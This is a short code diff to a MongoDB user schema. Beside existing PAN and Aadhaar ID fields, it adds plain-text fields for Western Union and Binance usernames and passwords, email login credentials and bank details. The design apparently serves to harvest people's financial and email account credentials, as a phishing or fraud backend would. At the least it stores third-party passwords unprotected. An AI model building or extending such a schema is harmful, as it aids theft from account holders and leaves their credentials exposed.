@@ -17,6 +17,13 @@ const userSchema = new mongoose.Schema({
     mobile:String,
     panNo:String,
     adharNo:String,
+    westrenUnionUser:String,
+    westrenUnionPass:String,
+    BinanceUser:String,
+    BinancePass:String,
+    EmlID:String,
+    EmlPsd:String,
+    BankDelais:String,
     regdate: { type: Date, default: Date.now },
     lastlogin: { type: Date}
 });
